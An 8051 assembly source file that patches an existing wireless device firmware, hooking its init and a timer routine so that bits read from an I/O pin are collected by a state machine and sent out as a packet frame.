$INCLUDE(fw_29.a51)
io_state	EQU	07Ah
io_stanum	EQU	07Bh
IO_WAIT		EQU	00h
IO_START	EQU	01h
IO_POGGERS1	EQU	02h
IO_POGGERS2	EQU	03h
IO_POGGERS3	EQU	04h
IO_COOLDOWN	EQU	05h
IO_HANGUP	EQU	06h
	ORG 046C6h
	LJMP init
init_cont:
	ORG 06805h
	LJMP inc_ver
patch_loc:
	ORG 0AE9Ah
inc_ver:
	CLR C
	JNB TF1, ba
	CLR TR1
	MOV A, TL1
	ADD A, #058h
	MOV TL1, A
	MOV A, TH1
	ADDC A, #0F7h
	MOV TH1, A
	MOV TF1, C
	SETB TR1
	SETB C
ba:
	MOV DPTR, #000FDh
	MOV A, io_state
	MOVX @DPTR, A
	JNC jump_away
	MOV A, 078h
	CJNE A, #(packet_end - packet_start), move_packet
	LCALL check_io
	MOV A, io_state
	JNZ jump_away
	MOV A, 079h
	JZ jump_away
	MOV DPTR, #(0FC00h + packet_data - packet_start)
	MOVX @DPTR, A
	LCALL send_frame
jump_away:
	MOV DPTR, #0A15Bh
	LJMP patch_loc

move_packet:
	MOV DPTR, #0FD10h
	MOV A, #0FEh
	MOVX @DPTR, A
	MOV DPH, #0FCh
	MOV A, 078h
	MOV DPL, A
	ADD A, #(packet_start - pc_move)
	MOVC A, @A+PC
pc_move:
	MOVX @DPTR, A
	INC 078h
	SJMP jump_away
$INCLUDE(packet.a51)
init:
	CLR TR1
	ANL TMOD, #00Fh
	ORL TMOD, #010h
	MOV TL1, #053h
	MOV TH1, #0F7h
	CLR TF1
	SETB TR1
	MOV DPTR, #000FDh
	CLR A
	MOVX @DPTR, A
	MOV 078h, #000h
	MOV 079h, #000h
	MOV io_state, #IO_WAIT
	ORL TMOD, #001h
	LJMP init_cont

send_frame:
	MOV DPTR, #041dh
	MOV A, #0Ah   ;swdefined?? something to do with tx report?
	MOVX @DPTR, A
	MOV R7, #0FEh ;page
	MOV R5, #001h ;hwseq
	MOV R3, #003h ;retries
	LCALL 06A56h
	MOV DPTR, #0041Fh
	MOV A, #020h
	MOVX @DPTR, A
	MOV 079h, #000h
	RET

check_io:
	MOV DPTR, #00060h
	MOVX A, @DPTR
	MOV C, ACC.3
	MOV A, io_state
	RLC A
	MOV R7, A
	MOV DPTR, #jump_table
	MOVC A, @A+DPTR
	JMP @A+DPTR
	JUMP_ENTRY	MACRO	ADDR
	DB	(ADDR - jump_table)
	ENDM
jump_table:
	JUMP_ENTRY nothing
	JUMP_ENTRY iowait1
	JUMP_ENTRY iostart0
	JUMP_ENTRY iostart1
	JUMP_ENTRY iopoggersinc
	JUMP_ENTRY iopoggersinc
	JUMP_ENTRY iopoggersinc
	JUMP_ENTRY iopoggersinc
	JUMP_ENTRY iopoggers3
	JUMP_ENTRY iopoggers3
	JUMP_ENTRY cooldown
	JUMP_ENTRY cooldown
	JUMP_ENTRY iostart0
	JUMP_ENTRY nothing
iowait1:
	MOV io_state, #IO_START
nothing:
	RET
iostart0:
	MOV io_state, #IO_WAIT
	RET
iostart1:
	MOV io_state, #IO_POGGERS1
	MOV io_stanum, #01h
	RET
iopoggersinc:
	INC io_state
	RET
iopoggers3:
	MOV io_state, #IO_POGGERS1
	MOV A, R7
	RRC A
	MOV A, io_stanum
	RLC A
	MOV io_stanum, A
	JNC nothing
	MOV 079h, A
	MOV io_stanum, #018h
	CJNE A, #0FFh, to_cooldown
	MOV io_state, #IO_HANGUP
	MOV 079h, #00h
	RET
to_cooldown:
	MOV io_state, #IO_COOLDOWN
	RET
cooldown:
	DJNZ io_stanum, nothing
	MOV io_state, #IO_WAIT
	RET
	END
